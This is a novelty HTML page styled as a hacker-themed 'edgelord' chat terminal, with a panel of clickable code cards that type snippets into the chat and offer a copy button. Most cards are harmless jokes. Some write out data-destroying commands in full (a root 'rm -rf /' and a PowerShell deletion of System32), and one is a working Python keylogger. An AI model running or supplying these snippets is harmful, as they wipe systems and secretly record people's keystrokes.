<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>VOID.TXT — edgelord terminal</title>
<style>
  :root{
    --bg:#050505;
    --panel:#0a0a0c;
    --panel2:#0e0e12;
    --border:#1f1f26;
    --border-hot:#2a2a33;
    --text:#b8b8c0;
    --dim:#666670;
    --acid:#39ff14;
    --blood:#ff1f3d;
    --violet:#b44dff;
    --cyan:#00e5ff;
    --amber:#ffb000;
    --mono:'Cascadia Code','Fira Code','JetBrains Mono',Consolas,monospace;
    --sans:'Segoe UI',system-ui,sans-serif;
  }
  *{box-sizing:border-box;margin:0;padding:0}
  html,body{height:100%}
  body{
    background:var(--bg);
    color:var(--text);
    font-family:var(--sans);
    overflow:hidden;
    position:relative;
  }

  /* matrix rain */
  #rain{position:fixed;inset:0;z-index:0;opacity:.12;pointer-events:none}

  /* CRT overlays */
  .scanlines{position:fixed;inset:0;z-index:50;pointer-events:none;
    background:repeating-linear-gradient(0deg, rgba(0,0,0,.22) 0 1px, transparent 1px 3px);
    mix-blend-mode:multiply}
  .vignette{position:fixed;inset:0;z-index:49;pointer-events:none;
    background:radial-gradient(ellipse at center, transparent 55%, rgba(0,0,0,.85) 100%)}
  .flicker{position:fixed;inset:0;z-index:51;pointer-events:none;
    background:rgba(57,255,20,.015);opacity:0;animation:flick 8s infinite}
  @keyframes flick{0%,100%{opacity:0}1%{opacity:.5}2%{opacity:0}31%{opacity:.35}32%{opacity:0}67%{opacity:.2}68%{opacity:0}}

  .app{position:relative;z-index:10;display:grid;grid-template-columns:1fr 360px;
    height:100vh;max-width:1500px;margin:0 auto;padding:14px;gap:14px}

  /* ===== CHAT PANE ===== */
  .chatpane{display:flex;flex-direction:column;background:var(--panel);
    border:1px solid var(--border);border-radius:10px;overflow:hidden;
    box-shadow:0 0 0 1px rgba(57,255,20,.03), inset 0 0 80px rgba(0,0,0,.6)}
  .chathead{display:flex;align-items:center;gap:10px;padding:12px 16px;
    border-bottom:1px solid var(--border);background:var(--panel2)}
  .dot{width:10px;height:10px;border-radius:50%}
  .dot.r{background:var(--blood);box-shadow:0 0 8px var(--blood)}
  .dot.y{background:var(--amber);box-shadow:0 0 8px var(--amber)}
  .dot.g{background:var(--acid);box-shadow:0 0 8px var(--acid)}
  .chathead .title{font-family:var(--mono);font-size:13px;letter-spacing:2px;color:var(--acid);
    text-shadow:0 0 6px rgba(57,255,20,.6)}
  .chathead .sub{font-size:11px;color:var(--dim);margin-left:auto}

  .chatlog{flex:1;overflow-y:auto;padding:16px;display:flex;flex-direction:column;gap:12px}
  .chatlog::-webkit-scrollbar{width:8px}
  .chatlog::-webkit-scrollbar-thumb{background:var(--border-hot);border-radius:4px}
  .chatlog::-webkit-scrollbar-track{background:transparent}

  .msg{max-width:82%;display:flex;flex-direction:column;gap:4px;animation:pop .25s ease}
  @keyframes pop{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:none}}
  .msg .who{font-size:10px;font-family:var(--mono);letter-spacing:1px;color:var(--dim)}
  .msg .bubble{padding:10px 12px;border-radius:8px;font-size:13.5px;line-height:1.5;word-break:break-word}
  .msg.me{align-self:flex-end;align-items:flex-end}
  .msg.me .bubble{background:linear-gradient(180deg,#14161f,#101218);
    border:1px solid var(--border-hot);color:#d5d5de}
  .msg.they{align-self:flex-start;align-items:flex-start}
  .msg.they .bubble{background:#0c0c10;border:1px solid var(--border);color:var(--text)}
  .msg.sys{align-self:center;align-items:center;max-width:100%}
  .msg.sys .bubble{background:transparent;border:1px dashed var(--border-hot);
    color:var(--dim);font-size:11px;font-family:var(--mono)}

  /* code drop */
  .code{font-family:var(--mono);font-size:12px;background:#070709;border:1px solid var(--border);
    border-left:3px solid var(--acid);border-radius:6px;padding:12px;margin-top:4px;
    position:relative;white-space:pre-wrap;color:#c9d6c9;overflow-x:auto;
    box-shadow:0 0 20px rgba(57,255,20,.06)}
  .code .lang{position:absolute;top:6px;right:6px;font-size:9px;letter-spacing:1px;color:var(--dim)}
  .code .c{color:var(--acid)}   /* keywords */
  .code .s{color:var(--violet)} /* strings */
  .code .f{color:var(--cyan)}   /* functions */
  .code .n{color:var(--amber)}  /* numbers */
  .code .cm{color:#4f7a4f}      /* comments */
  .copier{position:absolute;top:6px;left:6px;font-size:9px;letter-spacing:1px;
    color:var(--dim);cursor:pointer;padding:2px 6px;border:1px solid var(--border);
    border-radius:4px;opacity:.7;transition:.15s}
  .copier:hover{color:var(--acid);border-color:var(--acid);opacity:1}

  .inputbar{display:flex;gap:8px;padding:12px;border-top:1px solid var(--border);background:var(--panel2)}
  .inputbar input{flex:1;background:#070709;border:1px solid var(--border);
    border-radius:6px;color:var(--text);font-family:var(--mono);font-size:13px;padding:10px 12px;outline:none}
  .inputbar input:focus{border-color:var(--acid);box-shadow:0 0 0 1px rgba(57,255,20,.25)}
  .inputbar button{background:var(--acid);color:#000;border:none;border-radius:6px;
    font-family:var(--mono);font-weight:700;letter-spacing:1px;padding:0 18px;cursor:pointer;
    transition:.15s;text-transform:uppercase}
  .inputbar button:hover{background:#fff;box-shadow:0 0 18px rgba(57,255,20,.5)}

  /* ===== CARDS PANE ===== */
  .cardpane{display:flex;flex-direction:column;gap:14px;min-width:0}
  .cardpane h2{font-family:var(--mono);font-size:12px;letter-spacing:3px;color:var(--dim);
    text-transform:uppercase;padding:2px 4px;border-bottom:1px solid var(--border)}
  .glitch{position:relative;font-family:var(--mono);font-size:22px;font-weight:700;letter-spacing:4px;
    color:#e8e8ee;text-align:center;padding:8px 0}
  .glitch::before,.glitch::after{content:attr(data-t);position:absolute;left:0;right:0;top:0}
  .glitch::before{color:var(--blood);clip-path:inset(0 0 55% 0);animation:gl1 3s infinite linear alternate;
    transform:translate(-2px,-1px)}
  .glitch::after{color:var(--cyan);clip-path:inset(55% 0 0 0);animation:gl2 2.7s infinite linear alternate;
    transform:translate(2px,1px)}
  @keyframes gl1{0%,5%,95%,100%{transform:translate(0)}10%{transform:translate(-3px,1px)}60%{transform:translate(2px,-1px)}}
  @keyframes gl2{0%,4%,94%,100%{transform:translate(0)}12%{transform:translate(3px,-1px)}55%{transform:translate(-2px,1px)}}

  .grid{display:grid;grid-template-columns:1fr;gap:10px;overflow-y:auto;padding-right:2px;flex:1}
  .grid::-webkit-scrollbar{width:8px}
  .grid::-webkit-scrollbar-thumb{background:var(--border-hot);border-radius:4px}

  .card{background:var(--panel2);border:1px solid var(--border);border-radius:8px;
    padding:12px 14px;cursor:pointer;position:relative;transition:.16s;overflow:hidden}
  .card:hover{border-color:var(--acid);transform:translateX(4px);box-shadow:-4px 0 0 rgba(57,255,20,.4), 0 0 18px rgba(57,255,20,.08)}
  .card .name{font-family:var(--mono);font-size:13px;font-weight:700;color:#e6e6ee;display:flex;align-items:center;gap:8px}
  .card .tag{font-size:8px;letter-spacing:1px;padding:2px 6px;border-radius:3px;font-weight:400}
  .tag.cpp{background:rgba(57,255,20,.12);color:var(--acid);border:1px solid rgba(57,255,20,.3)}
  .tag.py{background:rgba(0,229,255,.12);color:var(--cyan);border:1px solid rgba(0,229,255,.3)}
  .tag.sh{background:rgba(255,31,61,.12);color:var(--blood);border:1px solid rgba(255,31,61,.3)}
  .tag.js{background:rgba(255,176,0,.12);color:var(--amber);border:1px solid rgba(255,176,0,.3)}
  .card .desc{font-size:11.5px;color:var(--dim);margin-top:5px;line-height:1.4}
  .card .grab{position:absolute;right:10px;bottom:10px;font-family:var(--mono);font-size:9px;
    color:var(--dim);letter-spacing:1px;opacity:0;transition:.15s}
  .card:hover .grab{opacity:1;color:var(--acid)}

  @media(max-width:900px){.app{grid-template-columns:1fr}.cardpane{order:-1}}
</style>
</head>
<body>
<canvas id="rain"></canvas>
<div class="scanlines"></div>
<div class="vignette"></div>
<div class="flicker"></div>

<div class="app">
  <!-- CHAT -->
  <div class="chatpane">
    <div class="chathead">
      <span class="dot r"></span><span class="dot y"></span><span class="dot g"></span>
      <span class="title">VOID.TXT :: SESSION 0xDEAD</span>
      <span class="sub">encryption: none (we die like men)</span>
    </div>
    <div class="chatlog" id="log"></div>
    <div class="inputbar">
      <input id="inp" type="text" placeholder="type something edgy..." autocomplete="off" spellcheck="false">
      <button id="send">SEND</button>
    </div>
  </div>

  <!-- CARDS -->
  <div class="cardpane">
    <div class="glitch" data-t="EDGELORD_KIT">EDGELORD_KIT</div>
    <div class="grid" id="grid"></div>
  </div>
</div>

<script>
/* ---------- matrix rain ---------- */
const cv = document.getElementById('rain');
const cx = cv.getContext('2d');
let W,H,cols,drops;
function sizeRain(){
  W = cv.width = innerWidth; H = cv.height = innerHeight;
  cols = Math.floor(W/16); drops = Array(cols).fill(1);
}
sizeRain(); addEventListener('resize', sizeRain);
const glyphs = 'アイウエオカキクケコサシスセソタチツテトナニヌネノ01<>/#$%&*';
function tick(){
  cx.fillStyle = 'rgba(5,5,5,0.08)';
  cx.fillRect(0,0,W,H);
  cx.font = '15px monospace';
  for(let i=0;i<cols;i++){
    const g = glyphs[Math.floor(Math.random()*glyphs.length)];
    cx.fillStyle = '#39ff14';
    cx.fillText(g, i*16, drops[i]*16);
    if(drops[i]*16 > H && Math.random() > 0.975) drops[i] = 0;
    drops[i]++;
  }
}
setInterval(tick, 50);

/* ---------- edgelord cards ---------- */
const CARDS = [
  {name:'sudo_rm_rf.sh', lang:'bash', tag:'sh', desc:'the forbidden command. run as root, kiss your drive goodbye.',
   code:`#!/bin/bash
# the nuclear option
echo "destroying everything you hold dear..."
sudo rm -rf --no-preserve-root /`},
  {name:'kernel_haxxor.c', lang:'c', tag:'cpp', desc:'real edgelord syscall abuse. not for normies.',
   code:`// ring0 dreams, ring3 reality
#include <unistd.h>
#include <sys/syscall.h>

int main(void) {
    // we out here.
    syscall(SYS_write, 1, "I'm in.\n", 8);
    return 0; // never caught
}`},
  {name:'keylogger.py', lang:'python', tag:'py', desc:'keystroke vacuum. don\'t tell HR.',
   code:`import keyboard

LOG = "keys.log"

def on_key(e):
    with open(LOG, "a") as f:
        f.write(e.name + " ")

keyboard.on_press(on_key)
keyboard.wait()`},
  {name:'port_scan.py', lang:'python', tag:'py', desc:'poke every hole in the wall.',
   code:`import socket

target = input("target: ")
for port in range(1, 1025):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(0.1)
    if s.connect_ex((target, port)) == 0:
        print(f"[OPEN] {port}")
    s.close()`},
  {name:'glitch_self.js', lang:'js', tag:'js', desc:'make the DOM have a seizure.',
   code:`// visual chaos
setInterval(() => {
  document.body.style.transform =
    \`translate(\${Math.random()*4-2}px, \${Math.random()*4-2}px)\`;
  setTimeout(() => document.body.style.transform = '', 40);
}, 120);`},
  {name:'dead_mans_switch.sh', lang:'bash', tag:'sh', desc:'if I stop typing, everything burns.',
   code:`#!/bin/bash
# dead man's switch
TIMEOUT=30
while true; do
  read -t $TIMEOUT -p "still here? " && echo "ok"
  if [ $? -ne 0 ]; then
    echo "goodbye."
    # insert payload here
    break
  fi
done`},
  {name:'process_reaper.c', lang:'c', tag:'cpp', desc:'find and kill by name. gentle.',
   code:`#include <stdio.h>
#include <signal.h>
#include <string.h>

int main(int argc, char** argv) {
    char cmd[256];
    snprintf(cmd, sizeof cmd, "pkill -9 %s", argv[1]);
    system(cmd);
    return 0;
}`},
  {name:'neon_skull.py', lang:'python', tag:'py', desc:'because every edgelord needs a skull.',
   code:`skull = r\"\"\"
    .-"""-.
   /       \\
  |  R  R  |
  |    v   |
   \\  -_-  /
    '-...-'
\"\"\"
print("\\033[91m" + skull + "\\033[0m")`},
  {name:'destroy_windows.ps1', lang:'powershell', tag:'sh', desc:'the IT guy\'s worst nightmare.',
   code:`# do NOT run this. seriously.
Get-Process | Stop-Process -Force
Remove-Item C:\\Windows\\System32 -Recurse -Force`},
  {name:'infinite_recursion.c', lang:'c', tag:'cpp', desc:'stack overflow speedrun any%',
   code:`// no base case. we die on purpose.
void self_destruct(int n) {
    self_destruct(n + 1);
}

int main(void) {
    self_destruct(0);
}`},
  {name:'bypass_the_firewall.sh', lang:'bash', tag:'sh', desc:'(it does not actually bypass anything)',
   code:`#!/bin/bash
echo "bypassing firewall..."
sleep 2
echo "firewall bypassed. you're welcome."
# no it wasn't`},
  {name:'ai_doomer.py', lang:'python', tag:'py', desc:'the machine says what we all think.',
   code:`import random

lines = [
    "nothing matters.",
    "the void stares back.",
    "your code is temporary.",
    "embrace entropy.",
    "ship it anyway."
]
print(random.choice(lines))`}
];

/* ---------- render cards ---------- */
const grid = document.getElementById('grid');
const log  = document.getElementById('log');

CARDS.forEach((c, i) => {
  const el = document.createElement('div');
  el.className = 'card';
  el.innerHTML = `
    <div class="name">${c.name} <span class="tag ${c.tag}">${c.lang}</span></div>
    <div class="desc">${c.desc}</div>
    <div class="grab">[ CLICK TO DROP ]</div>`;
  el.onclick = () => dropCard(c);
  grid.appendChild(el);
});

/* ---------- chat helpers ---------- */
function sys(text){
  const m = document.createElement('div');
  m.className = 'msg sys';
  m.innerHTML = `<div class="bubble">${text}</div>`;
  log.appendChild(m); scrollDown();
}
function scrollDown(){ log.scrollTop = log.scrollHeight; }

function escapeHtml(s){
  return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
}

/* tiny highlighter: highlight strings, comments, numbers, keywords */
function highlight(code, lang){
  let esc = escapeHtml(code);
  // comments
  esc = esc.replace(/(\/\/.*$|#.*$|\/\*[\s\S]*?\*\/)/gm, '<span class="cm">$1</span>');
  // strings
  esc = esc.replace(/(&quot;.*?&quot;|'.*?'|`.*?`)/g, '<span class="s">$1</span>');
  // numbers
  esc = esc.replace(/\b(\d+)\b/g, '<span class="n">$1</span>');
  return esc;
}

/* drop a card into chat as a message */
function dropCard(c){
  const m = document.createElement('div');
  m.className = 'msg they';
  m.innerHTML = `
    <div class="who">SYSTEM › dropped ${c.name}</div>
    <div class="bubble">loading payload…</div>`;
  log.appendChild(m); scrollDown();
  const bubble = m.querySelector('.bubble');

  // typewriter the code into the bubble
  const full = highlight(c.code);
  const plain = c.code;
  bubble.innerHTML = '<span class="lang">'+c.lang+'</span>';
  const codeWrap = document.createElement('div');
  codeWrap.className = 'code';
  bubble.appendChild(codeWrap);

  let shown = 0;
  const ch = Math.max(1, Math.floor(plain.length / 40));
  const id = setInterval(() => {
    shown += ch;
    if(shown >= plain.length){ shown = plain.length; clearInterval(id); addCopy(codeWrap, plain); }
    codeWrap.innerHTML = highlight(plain.slice(0, shown));
    scrollDown();
  }, 16);

  // banner ping
  sys(`[ ${c.name} ] dropped into the void`);
}

function addCopy(el, code){
  const btn = document.createElement('span');
  btn.className = 'copier';
  btn.textContent = '[COPY]';
  btn.onclick = () => {
    navigator.clipboard.writeText(code).then(() => {
      btn.textContent = '[COPIED ✓]';
      setTimeout(() => btn.textContent = '[COPY]', 1200);
    });
  };
  el.prepend(btn);
}

/* ---------- canned edgelord replies ---------- */
const REPLIES = [
  "cool. anyway, the void remains.",
  "i've seen worse in /tmp.",
  "that's not edgy, that's just sad. love it.",
  "the machine has no feelings. neither do i.",
  "ok but can it run doom?",
  "real talk: nobody is reading your code.",
  "01001101 01100101 01101000.",
  "you exist to suffer. ship it.",
  "the compiler fears you.",
  "another day, another segfault."
];
function reply(){
  return REPLIES[Math.floor(Math.random()*REPLIES.length)];
}

function userMsg(text){
  const m = document.createElement('div');
  m.className = 'msg me';
  m.innerHTML = `<div class="who">YOU</div><div class="bubble">${escapeHtml(text)}</div>`;
  log.appendChild(m); scrollDown();
  setTimeout(() => {
    const r = document.createElement('div');
    r.className = 'msg they';
    r.innerHTML = `<div class="who">VOID</div><div class="bubble">${escapeHtml(reply())}</div>`;
    log.appendChild(r); scrollDown();
  }, 500 + Math.random()*600);
}

/* ---------- send handling ---------- */
const inp = document.getElementById('inp');
function send(){
  const v = inp.value.trim();
  if(!v) return;
  userMsg(v);
  inp.value = '';
}
document.getElementById('send').onclick = send;
inp.addEventListener('keydown', e => { if(e.key === 'Enter') send(); });

/* ---------- boot sequence ---------- */
window.addEventListener('load', () => {
  const boot = [
    "> initializing VOID.TXT...",
    "> loading edgelord module... done",
    "> connecting to the abyss... connected",
    "> session key: none. we rawdog it.",
    "> select a card to drop payloads into chat."
  ];
  let i = 0;
  const iv = setInterval(() => {
    sys(boot[i]); i++;
    if(i >= boot.length) clearInterval(iv);
  }, 380);
});
</script>
</body>
</html>
